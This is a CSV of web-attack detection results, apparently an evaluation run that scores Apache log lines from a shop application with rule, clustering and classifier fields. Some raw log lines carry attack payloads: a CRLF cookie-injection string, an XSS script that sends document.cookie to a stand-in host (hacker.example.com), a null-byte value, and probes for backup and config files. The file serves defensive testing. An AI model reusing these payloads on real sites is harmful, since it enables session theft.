run_id,record_id,source_type,rule_hit,rule_name,rule_severity,rule_reason,anomaly_score,anomaly_threshold,anomaly_model,anomaly_version,is_anomaly,anomaly_reason,is_unknown,osr_method,osr_reason,osr_pred_label,osr_final_label,osr_max_prob,osr_prob_threshold,osr_distance,osr_distance_threshold,osr_reject_reason,final_label,stage,confidence,risk_score,raw_text
external_unknown_20260511_064646,apache_28,apache_log,0,,,no apache rule matched,0.95,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=-1; cluster_size=22; noise_point=-1; heuristic=long_query=290; encoded_tokens=9; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9659239649772644, ""dist_to_pred_centroid"": 4.243348121643066, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9659239649772644,0.5398888796567917,4.243348121643066,4.467410373687743,accepted,suspicious,anomaly,0.75,0.95,"172.20.0.28 - - [10/May/2026:22:00:27 +0800] ""GET /tienda1/publico/registro.jsp?modo=registro&login=armand&password=prusiato&nombre=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar HTTP/1.1"" 200 827 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_29,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6005439758300781, ""dist_to_pred_centroid"": 4.832094192504883, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6005439758300781,0.5398888796567917,4.832094192504883,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.29 - - [10/May/2026:22:00:28 +0800] ""POST /tienda1/publico/registro.jsp HTTP/1.1"" 200 828 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_30,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=7; cluster_size=10; minority_cluster=1; heuristic=long_query=246; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9666818380355835, ""dist_to_pred_centroid"": 4.437774658203125, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9666818380355835,0.5398888796567917,4.437774658203125,4.467410373687743,accepted,suspicious,anomaly,0.75,0.78,"172.20.0.30 - - [10/May/2026:22:00:29 +0800] ""GET /tienda1/publico/registro.jsp?modo=registro&login=bau*gnon&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar HTTP/1.1"" 200 829 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_31,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6005439758300781, ""dist_to_pred_centroid"": 4.832094192504883, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6005439758300781,0.5398888796567917,4.832094192504883,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.31 - - [10/May/2026:22:00:30 +0800] ""POST /tienda1/publico/registro.jsp HTTP/1.1"" 200 830 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_32,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=7; cluster_size=10; minority_cluster=1; heuristic=long_query=245; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9674292206764221, ""dist_to_pred_centroid"": 4.538902759552002, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9674292206764221,0.5398888796567917,4.538902759552002,4.467410373687743,accepted,suspicious,anomaly,0.75,0.78,"172.20.0.32 - - [10/May/2026:22:00:31 +0800] ""GET /tienda1/publico/registro.jsp?modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar HTTP/1.1"" 200 831 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_33,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6005439758300781, ""dist_to_pred_centroid"": 4.832094192504883, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6005439758300781,0.5398888796567917,4.832094192504883,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.33 - - [10/May/2026:22:00:32 +0800] ""POST /tienda1/publico/registro.jsp HTTP/1.1"" 200 832 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_34,apache_log,0,,,no apache rule matched,0.95,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=-1; cluster_size=22; noise_point=-1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""suspicious_path_probe"", ""final_label"": ""unknown"", ""max_prob"": 0.49415284395217896, ""dist_to_pred_centroid"": 5.293608665466309, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 5.560724353790283, ""is_unknown"": 1, ""reject_reason"": ""low_confidence"", ""engine_ready"": true, ""engine_error"": """"}",suspicious_path_probe,unknown,0.49415284395217896,0.5398888796567917,5.293608665466309,5.560724353790283,low_confidence,unknown,osr,0.49415284395217896,0.95,"172.20.0.34 - - [10/May/2026:22:00:33 +0800] ""GET /asf-logo-wide.gif HTTP/1.1"" 200 833 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_35,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=4; cluster_size=6; minority_cluster=1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""unknown"", ""max_prob"": 0.49563029408454895, ""dist_to_pred_centroid"": 5.542181491851807, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",benign,unknown,0.49563029408454895,0.5398888796567917,5.542181491851807,4.467410373687743,low_confidence+far_from_centroid,unknown,osr,0.49563029408454895,0.85,"172.20.0.35 - - [10/May/2026:22:00:34 +0800] ""GET /tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%7C HTTP/1.1"" 200 834 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_36,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""unknown"", ""max_prob"": 0.4517965614795685, ""dist_to_pred_centroid"": 5.668252944946289, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",benign,unknown,0.4517965614795685,0.5398888796567917,5.668252944946289,4.467410373687743,low_confidence+far_from_centroid,unknown,osr,0.4517965614795685,0.85,"172.20.0.36 - - [10/May/2026:22:00:35 +0800] ""POST /tienda1/publico/vaciar.jsp HTTP/1.1"" 200 835 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_37,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=4; cluster_size=6; minority_cluster=1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""unknown"", ""max_prob"": 0.5375929474830627, ""dist_to_pred_centroid"": 5.099139213562012, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",benign,unknown,0.5375929474830627,0.5398888796567917,5.099139213562012,4.467410373687743,low_confidence+far_from_centroid,unknown,osr,0.5375929474830627,0.85,"172.20.0.37 - - [10/May/2026:22:00:36 +0800] ""GET /tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1"" 200 836 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_38,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""unknown"", ""max_prob"": 0.4517965614795685, ""dist_to_pred_centroid"": 5.668252944946289, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",benign,unknown,0.4517965614795685,0.5398888796567917,5.668252944946289,4.467410373687743,low_confidence+far_from_centroid,unknown,osr,0.4517965614795685,0.85,"172.20.0.38 - - [10/May/2026:22:00:37 +0800] ""POST /tienda1/publico/vaciar.jsp HTTP/1.1"" 200 837 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_39,apache_log,0,,,no apache rule matched,0.95,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=-1; cluster_size=22; noise_point=-1; heuristic=long_path=45; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.5691879391670227, ""dist_to_pred_centroid"": 5.062938213348389, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.5691879391670227,0.5398888796567917,5.062938213348389,4.467410373687743,accepted,suspicious,anomaly,0.75,0.95,"172.20.0.39 - - [10/May/2026:22:00:38 +0800] ""GET /tienda1/global/menum.jsp/4861362529278789730 HTTP/1.1"" 200 838 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_40,apache_log,0,,,no apache rule matched,0.95,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=-1; cluster_size=22; noise_point=-1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""unknown"", ""max_prob"": 0.4082593321800232, ""dist_to_pred_centroid"": 5.657351016998291, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",benign,unknown,0.4082593321800232,0.5398888796567917,5.657351016998291,4.467410373687743,low_confidence+far_from_centroid,unknown,osr,0.4082593321800232,0.95,"172.20.0.40 - - [10/May/2026:22:00:39 +0800] ""GET /iisstart.htm HTTP/1.1"" 200 839 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_41,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=8; cluster_size=6; minority_cluster=1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""unknown"", ""max_prob"": 0.353195458650589, ""dist_to_pred_centroid"": 6.027315139770508, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",benign,unknown,0.353195458650589,0.5398888796567917,6.027315139770508,4.467410373687743,low_confidence+far_from_centroid,unknown,osr,0.353195458650589,0.85,"172.20.0.41 - - [10/May/2026:22:00:40 +0800] ""GET /travelnet/home.jsp HTTP/1.1"" 200 840 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_42,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6642426252365112, ""dist_to_pred_centroid"": 4.238584518432617, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6642426252365112,0.5398888796567917,4.238584518432617,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.42 - - [10/May/2026:22:00:41 +0800] ""GET /tienda1/miembros/imagenes.BAK HTTP/1.1"" 200 841 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_43,apache_log,0,,,no apache rule matched,0.95,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=-1; cluster_size=22; noise_point=-1; heuristic=long_path=59; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6563995480537415, ""dist_to_pred_centroid"": 4.212051868438721, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6563995480537415,0.5398888796567917,4.212051868438721,4.467410373687743,accepted,suspicious,anomaly,0.75,0.95,"172.20.0.43 - - [10/May/2026:22:00:42 +0800] ""GET /tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif.old HTTP/1.1"" 200 842 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_44,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6636343002319336, ""dist_to_pred_centroid"": 4.516534805297852, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6636343002319336,0.5398888796567917,4.516534805297852,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.44 - - [10/May/2026:22:00:43 +0800] ""GET /tienda1/miembros/index.jsp/ HTTP/1.1"" 200 843 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_45,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6538090109825134, ""dist_to_pred_centroid"": 4.35519552230835, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6538090109825134,0.5398888796567917,4.35519552230835,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.45 - - [10/May/2026:22:00:44 +0800] ""GET /tienda1/miembros/index.jsp.INC HTTP/1.1"" 200 844 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_46,apache_log,0,,,no apache rule matched,0.95,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=-1; cluster_size=22; noise_point=-1; heuristic=long_query=358; encoded_tokens=20; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9670228362083435, ""dist_to_pred_centroid"": 4.336797714233398, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9670228362083435,0.5398888796567917,4.336797714233398,4.467410373687743,accepted,suspicious,anomaly,0.75,0.95,"172.20.0.46 - - [10/May/2026:22:00:45 +0800] ""GET /tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar HTTP/1.1"" 200 845 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_47,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6939942240715027, ""dist_to_pred_centroid"": 4.264281749725342, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6939942240715027,0.5398888796567917,4.264281749725342,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.47 - - [10/May/2026:22:00:46 +0800] ""POST /tienda1/miembros/editar.jsp HTTP/1.1"" 200 846 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_48,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=7; cluster_size=10; minority_cluster=1; heuristic=long_query=218; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9685381650924683, ""dist_to_pred_centroid"": 4.340775966644287, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9685381650924683,0.5398888796567917,4.340775966644287,4.467410373687743,accepted,suspicious,anomaly,0.75,0.78,"172.20.0.48 - - [10/May/2026:22:00:47 +0800] ""GET /tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar HTTP/1.1"" 200 847 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_49,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6939942240715027, ""dist_to_pred_centroid"": 4.264281749725342, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6939942240715027,0.5398888796567917,4.264281749725342,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.49 - - [10/May/2026:22:00:48 +0800] ""POST /tienda1/miembros/editar.jsp HTTP/1.1"" 200 848 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_50,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=7; cluster_size=10; minority_cluster=1; heuristic=long_query=229; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9647673964500427, ""dist_to_pred_centroid"": 4.410992622375488, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9647673964500427,0.5398888796567917,4.410992622375488,4.467410373687743,accepted,suspicious,anomaly,0.75,0.78,"172.20.0.50 - - [10/May/2026:22:00:49 +0800] ""GET /tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar HTTP/1.1"" 200 849 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_51,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6939942240715027, ""dist_to_pred_centroid"": 4.264281749725342, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6939942240715027,0.5398888796567917,4.264281749725342,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.51 - - [10/May/2026:22:00:50 +0800] ""POST /tienda1/miembros/editar.jsp HTTP/1.1"" 200 850 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_52,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=7; cluster_size=10; minority_cluster=1; heuristic=long_query=225; special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.9669308066368103, ""dist_to_pred_centroid"": 4.325023651123047, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.9669308066368103,0.5398888796567917,4.325023651123047,4.467410373687743,accepted,suspicious,anomaly,0.75,0.78,"172.20.0.52 - - [10/May/2026:22:00:51 +0800] ""GET /tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar HTTP/1.1"" 200 851 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_53,apache_log,0,,,no apache rule matched,0.15,0.68,webhawk_pca_dbscan,midterm-0.3,0,backend=webhawk_core; eps=0.3363; cluster=0; cluster_size=53; cluster_normal=1; heuristic=special_tokens=6,0,textcnn_osr_hardneg75,"{""pred_label"": ""benign"", ""final_label"": ""benign"", ""max_prob"": 0.6939942240715027, ""dist_to_pred_centroid"": 4.264281749725342, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 4.467410373687743, ""is_unknown"": 0, ""reject_reason"": ""accepted"", ""engine_ready"": true, ""engine_error"": """"}",benign,benign,0.6939942240715027,0.5398888796567917,4.264281749725342,4.467410373687743,accepted,benign,normal,0.9,0.15,"172.20.0.53 - - [10/May/2026:22:00:52 +0800] ""POST /tienda1/miembros/editar.jsp HTTP/1.1"" 200 852 ""-"" ""Mozilla/5.0"""
external_unknown_20260511_064646,apache_54,apache_log,0,,,no apache rule matched,0.78,0.68,webhawk_pca_dbscan,midterm-0.3,1,backend=webhawk_core; eps=0.3363; cluster=8; cluster_size=6; minority_cluster=1; heuristic=special_tokens=6,1,textcnn_osr_hardneg75,"{""pred_label"": ""suspicious_path_probe"", ""final_label"": ""unknown"", ""max_prob"": 0.3776009678840637, ""dist_to_pred_centroid"": 6.066224575042725, ""prob_threshold"": 0.5398888796567917, ""class_distance_threshold"": 5.560724353790283, ""is_unknown"": 1, ""reject_reason"": ""low_confidence+far_from_centroid"", ""engine_ready"": true, ""engine_error"": """"}",suspicious_path_probe,unknown,0.3776009678840637,0.5398888796567917,6.066224575042725,5.560724353790283,low_confidence+far_from_centroid,unknown,osr,0.3776009678840637,0.85,"172.20.0.54 - - [10/May/2026:22:00:53 +0800] ""GET /_cti_pvt/access.cnf HTTP/1.1"" 200 853 ""-"" ""Mozilla/5.0"""
